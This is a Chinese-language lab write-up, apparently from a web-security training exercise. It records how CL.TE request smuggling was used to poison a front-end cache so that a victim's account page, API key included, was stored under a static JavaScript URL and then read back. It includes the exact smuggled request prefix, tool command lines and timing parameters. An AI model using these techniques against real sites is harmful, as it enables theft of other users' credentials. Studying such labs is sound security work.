---
title: "lab-perform-web-cache-deception"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-perform-web-cache-deception

> evidences: [[request-smuggling-family]]

- 题面:前端不支持 chunked(用 CL)、前端缓存静态资源;目标 = 走私让下一个用户的请求把其 API key 存进缓存,再取出提交(`POST /submitSolution` 参数 `answer`)。无 exploit server。实例(批 44)`0ab0008703f9783a80fe031a009900b9`。
- 判定:**solved**(横幅 `Congratulations, you solved the lab!`),key 从缓存里受害者的账户页读出后提交。

## 收口链(两帧 + 一探针)

1. **缓存判定**:`/resources/js/tracking.js`(200/70B,`Cache-Control: max-age=30`)两次 miss→hit ✓;`/`、`/post?postId=N`、`/my-account` 无 max-age ⇒ 不缓存。受害者每次开首页都会拉 `tracking.js` ⇒ **该 URL 就是缓存键载体**。
2. **arm**(CL.TE;走私请求**不闭合**且**不写 Host**,留给下一个请求补):
   `conn_reuse <lab>/ --path / --cl-te 'GET /my-account HTTP/1.1\r\nX-Pad: '`
   前端吃 CL、后端吃 TE:chunked ⇒ 后端在 `0\r\n\r\n` 结束外层 POST,余下 `GET /my-account HTTP/1.1\r\nX-Pad: ` 挂起。
3. **受害者补全**:受害者的 `GET /resources/js/tracking.js HTTP/1.1` 请求行成为 `X-Pad` 的值,其后的 `Host` / `Cookie: session=<victim>` 成为走私请求的头 ⇒ 后端按**受害者会话**返回 `/my-account`(含 API key);前端把这条响应记在 `tracking.js` 键上(max-age 30)。
   - 反例:走私请求自带 `Host:` ⇒ 下一个请求的 Host 让后端 400 `Duplicate header names are not allowed`(批 44 实测)。
4. **取出**:`GET /resources/js/tracking.js` ⇒ 3884B 的账户页(X-Cache: hit);`POST /submitSolution answer=<key>`。

## 节奏(关键)

- 受害者由"我们发若干 POST"触发;arm 的 `POST /` 本身即触发面。
- **探针会自己补全待定请求**:探针是 miss 时它充当补全者,只会拿到"无会话"的 302 并把 302 写进 `tracking.js`(污染 30s,反把受害者后续请求全变成命中)。故每轮留冷却 ≥ 该键 TTL:arm ×3 → 等 9s(受害者行动)→ 探针 1 次 → 冷却 32s。
- 件:项目件 `smuggle_win`(arm ×N → settle → check ×M → cooldown,命中即停并把正文写入 `--out`)。

## 复现

```
smuggle_win <lab>/ --smuggle 'GET /my-account HTTP/1.1\r\nX-Pad: ' \
  --check <lab>/resources/js/tracking.js --marker 'Your API Key' \
  --out /tmp/wcd-poison.html --rounds 4 --arms 3 --settle-ms 9000 --cooldown-ms 32000
```
